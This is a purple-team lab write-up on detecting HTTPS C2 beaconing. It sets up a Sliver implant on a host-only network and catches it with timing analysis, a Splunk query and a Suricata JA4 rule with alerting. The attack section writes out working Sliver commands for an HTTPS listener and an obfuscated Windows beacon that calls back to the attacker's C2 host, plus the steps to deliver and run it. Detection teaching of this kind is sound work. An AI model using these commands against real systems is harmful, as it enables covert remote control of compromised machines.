# T1071.001 — Application Layer Protocol: Web Protocols (C2 Beaconing)

>**Primary:** T1071.001 Application Layer Protocol: Web Protocols
>**Related**: T1573 Encrypted Channel (TLS) — payload opaque, detection relies on metadata
>**Tool:** Sliver C2 v1.7.3 (HTTPS beacon, ~65s interval)
>**Telemetry:** Suricata 8.0.5 (TLS metadata → eve.json) + tcpdump (PCAP)
>**Primary detection:** behavioral timing analysis — beacon-hunter.py (PCAP) and Splunk SPL (eve.json), no IOC required
>**Operationalization:** the implant's JA4, extracted after the beacon was found, turned into a fast real-time signature + alert pipeline (dashboard / Telegram)

After gaining a foothold on a host, an attacker rarely keeps a noisy, always-on connection to their server. Instead, the implant beacons: it reaches back to the Command and Control (C2) server at regular intervals to ask for new instructions, then goes quiet until the next check-in. By tunneling these check-ins inside ordinary HTTPS traffic to port 443, the activity blends into the noise of normal web browsing and survives most perimeter firewalls.

In this scenario a Sliver C2 implant beacons over HTTPS at a fixed ~65-second interval. Because the channel is TLS-encrypted, the payload cannot be inspected — so detection does not rely on reading the traffic. It relies on the one thing the attacker cannot hide without breaking the C2 channel: the rhythmic, low-jitter timing of the check-ins, which is far too regular to be human activity. That behavioral signal is the actual detection. The TLS fingerprint (JA4) becomes useful only afterwards, as explained in Section D — you cannot match a fingerprint you have not yet discovered.


# A. Attack Phase 
Note on real-world applicability: In a genuine intrusion the victim does not run a C2 implant by hand. The implant is dropped and executed after initial access — via a phishing macro, an exploited service, or a malicious download — and then runs silently in the background, beaconing to the attacker. The manual execution below stands in for that post-exploitation step so the resulting network behavior can be studied.

Roles / topology (host-only network):

  C2 server (attacker): Kali — 192.168.56.102, running the Sliver server
  Victim: Windows — DESKTOP-MJ170VE, running the beacon implant

### Step 1 — Start the Sliver C2 server (Kali)

On first launch Sliver unpacks its assets and generates a per-instance certificate authority — every implant is then compiled with unique X.509 keys, which is why the TLS fingerprint is consistent across check-ins.

### Step 2 — Start the HTTPS listener
```
sliver > https -L 192.168.56.102 -l 443
[*] Starting HTTPS :443 listener ...
[*] Successfully started job #1
```

The C2 channel runs over HTTPS/443 so the implant traffic blends into normal encrypted web activity and passes typical perimeter rules.

### Step 3 — Generate the beacon implant
```
sliver > generate beacon --http https://192.168.56.102:443 --seconds 60 --jitter 10 --os windows --arch amd64 --save /tmp/
[*] Generating new windows/amd64 beacon implant binary (1m0s)
[*] Symbol obfuscation is enabled
[*] Build completed in 5m15s
[*] Implant saved to /tmp/AVAILABLE_PATINA.exe
```

Key parameters that define the beacon's behavior — and therefore what the detection must catch:

   --seconds 60 --jitter 10 → check in every ~60s with up to 10s of random jitter (the ground truth for later timing analysis)
   beacon mode (not session) → periodic check-ins rather than an interactive connection, matching real-world C2 tradecraft


![Sliver](../screenshots/sliver-1.png?v=2)

### Step 4 — Deliver and execute on the victim (Windows)
The implant was transferred to the Windows host over a simple HTTP file server and executed:
```
.\AVAILABLE_PATINA.exe
```
The process returns to the prompt immediately and continues running in the background — no window, no output. This is expected: the implant enters its beacon loop silently and begins checking in to the C2 server.

### Step 5 — Confirm the beacon (Kali)
```
sliver > beacons
 ID         Name              Transport   Hostname         Last Check-in
 9a309279   AVAILABLE_PATINA  https        DESKTOP-MJ170VE   10s ago
```

A live beacon confirms the channel: the Windows host now reaches back to the C2 server roughly every 65 seconds, awaiting tasking. This periodic, encrypted check-in pattern is the behavior the detection layers (Suricata JA4, beacon-hunter.py, Splunk) are built to identify.


# B. Behavioral Detection beacon-hunter.py (custom tool, PCAP timing analysis)
This is the actual detection. In a real intrusion there is no label that says "this is Sliver" — there is only traffic, and the C2's IP, hash, and fingerprint are all unknown. The only thing that gives the beacon away is its timing: regular, low-jitter check-ins that no human produces.

A custom Python tool reads the capture, groups packets into check-in events per destination, and scores the regularity of the intervals using the coefficient of variation (CV). It is given no IP, no hash, no IOC — only packet timestamps:

![Suricata Log](../screenshots/sliver-2.png?v=2)

The tool recovered the ground-truth interval (~65s) and flagged 192.168.56.102 as a beacon purely on its low CV (4.3% jitter — too regular for human activity). Three things make this a real detection result, not a lucky match:

   It ranks every candidate. All five destinations are scored independently, not just the one we knew about.

   It rejects periodic noise. The multicast traffic (239.255.255.250 SSDP) is also periodic, but its CV of 2.17 (217% jitter) is wildly irregular — correctly marked False. Separating a true beacon from "anything that repeats" is the hard part.
   
   It is honest about thin data. 224.0.0.22 is flagged not enough separate events rather than force-scored.

Both 192.168.56.1 and 192.168.56.102 appear as suspects because --include-internal scores both ends of the same conversation — the victim sending check-ins and the C2 replying. They are one beacon; in triage the analyst attributes them to a single channel and focuses on the C2 endpoint.


# C. Splunk SPL (SIEM, same logic, independent data path)
The identical logic was rebuilt as a SIEM query, operating on Suricata's eve.json instead of the raw PCAP — a completely separate data path. Again it uses no IP, no hash, only timing. streamstats computes the gap between consecutive check-ins; the query flags any source/destination pair that checks in repeatedly with a low CV:

```
index=main sourcetype=_json event_type=tls
| sort 0 _time
| streamstats current=f last(_time) as prev by src_ip dest_ip dest_port
| eval interval=_time-prev
| where isnotnull(interval) AND interval>5 AND interval<600
| stats count as checkins, median(interval) as median_int, stdev(interval) as jitter, avg(interval) as mean_int by src_ip dest_ip dest_port
| eval cv=round(jitter/mean_int,3)
| where checkins>=10 AND cv<0.1
| eval verdict="BEACON SUSPECT"
| sort cv
| table src_ip dest_ip dest_port checkins median_int cv verdict
```

![Sliver](../screenshots/sliver-5.png?v=2)


# D. Three-way agreement
Two independent methods, on two different data sources (raw PCAP vs eve.json), with no shared inputs and no IOC, converged on the same beacon — and both match the ground truth:

| Method | Data source | Uses IOC? | Interval | CV |
|--------|-------------|-----------|----------|-----|
| Ground truth (Sliver config) | — | — | ~60–65s | — |
| beacon-hunter.py | raw PCAP | No | 65.26s | 0.043 |
| Splunk SPL | Suricata eve.json | No | 66.50s (median) | 0.044 |



# E. Operationalization — From Discovery to a Fast Signature & Alerting
Behavioral analysis discovered the beacon and pinpointed the C2 (192.168.56.102). At that point the analyst already has what they need to respond — in a real environment the immediate action is usually to block the C2 outright.

So why produce a signature at all? Because once the beacon is known, you no longer want to re-run a 30-minute timing analysis every time the same implant reappears. From the identified traffic, Suricata exposes a stable artifact in the TLS handshake — the implant's JA4 fingerprint:
```
t13i131000_f57a46bbacb6_e5728521abd4
```
This value is identical across all 30 check-ins, because Sliver is compiled in Go with a fixed TLS client configuration. Turning it into a signature gives a cheap, exact, real-time match for this implant going forward:
```
alert tls $HOME_NET any -> any any (msg:"HUNT Sliver C2 - JA4 fingerprint match"; ja4.hash; content:"t13i131000_f57a46bbacb6_e5728521abd4"; metadata:signature_severity Major; sid:200005; rev:1; classtype:trojan-activity;)
```

The honest framing — what this signature is and is not:

  It is not how the beacon was found. You cannot write a JA4 rule for a fingerprint you do not yet have. JA4 is the output of detection, not the input.
  
  Its real-world value is repeat detection and alerting: catching the same implant instantly on its next check-in (or on another host in the estate) without re-deriving anything, and feeding the SOC alert pipeline. In production the same JA4 could equally arrive from a threat-intel feed — the workflow is identical, only the source of the hash differs.
  
  It is fragile: a new Sliver release or a custom C2 profile changes the JA4 and the rule goes blind. That is acceptable because it is a known-bad fast-match, not the primary detection. The behavioral layer (Sections B/C) is what survives an unknown or re-tooled implant.


# F. Post-Attack Suricata Log Verification
Running the rule against the captured traffic confirms the detection. Each beacon check-in produces a 200005 alert:

![Suricata Log](../screenshots/sliver-3.png?v=2)


Detection note — checksum offloading: During offline replay (-r), Suricata initially produced no TLS events because the capture's packets failed checksum validation (a side effect of NIC offloading on the host-only adapter). Adding -k none disabled checksum verification, allowing TCP reassembly and TLS parsing to proceed, after which the JA4 events — and the alerts — appeared. Live capture (-i) was unaffected.


# G. Alerting Phase (React Dashboard + Telegram Bot)
Once the 200005 JA4 alert is written to eve.json, the Sentryfy backend picks it up and converts it into real-time notifications across two channels — turning raw IDS output into actionable visibility.

### Real-Time Dashboard
The custom Suricata IDS dashboard polls the alert feed and surfaces each detection live, classified by severity

The Sliver beacon detection appears as a HIGH severity alert, showing the signature (HUNT Sliver C2 - JA4 fingerprint match), the source (192.168.56.1, the victim), and the destination (192.168.56.102, the C2 server). The severity tier maps directly from the rule's signature_severity Major metadata, letting an analyst triage at a glance.

![Dashboard Alert](../screenshots/sliver-4.png?v=2)

### Telegram Notification
The same alert is pushed to a Telegram bot for out-of-band, push-based alerting — useful when an analyst is away from the dashboard:

The message carries the essentials an analyst needs to begin triage: the threat name, and the source → destination pair (192.168.56.1 → 192.168.56.102), delivered the moment the beacon is detected.

Tuning consideration — alert volume: Because the beacon checks in roughly every 65 seconds, the JA4 rule fires on every check-in — producing a continuous stream of identical alerts (≈55 per hour). In production this would flood both the dashboard and Telegram. The rule should therefore carry a threshold to rate-limit repeats from the same source:
```
threshold:type limit, track by_src, count 1, seconds 3600;
```

This caps notifications to one per source per hour while the underlying detection keeps firing — converting a noisy, repetitive signal into a single actionable alert. Managing low-variance, high-frequency alerts like this is a core part of operationalizing beacon detection.

![Telegram Log](../screenshots/sliver-6.jpg?v=2)


# H. Detection Limitations & Future Work

1. The behavioral detection needs a baseline (false positives).
The cv < 0.1 threshold assumes regular, low-jitter check-ins are inherently suspicious. But legitimate software also beacons regularly — monitoring agents, NTP, update pollers, telemetry. Without a known-good baseline, the timing query surfaces these as false positives. It should be scoped (unexpected source/destination pairs, non-business processes, rare destinations) or tuned against a baseline of normal periodic traffic, not alerted on blindly.

2. Jitter is the behavioral detection's natural limit (false negatives).
This beacon used --jitter 10, giving CV 0.043 — trivially regular. An attacker who raises jitter (e.g. --jitter 80) widens the interval spread, pushing the CV up and eventually past the cv < 0.1 threshold. High-jitter "low-and-slow" beacons are designed to defeat timing analysis. Note this is a false negative (missing a real beacon), not a false positive — and loosening the CV threshold to compensate would only increase false positives. The fix is not a looser threshold but stronger signals (see Future Work).

3. Short-lived implants evade timing analysis entirely.
Beacon detection is statistical: it needs enough check-ins (~30 here) for the CV to be meaningful. An implant that runs briefly or is killed quickly never produces enough events to be scored (checkins >= 10).

4. The JA4 signature is disposable, by design.
As stated in Section D, it is a known-bad fast-match, not a discovery method. It catches only this exact implant build and breaks on re-tooling. It earns its place as an alerting accelerator, not as the detection's foundation.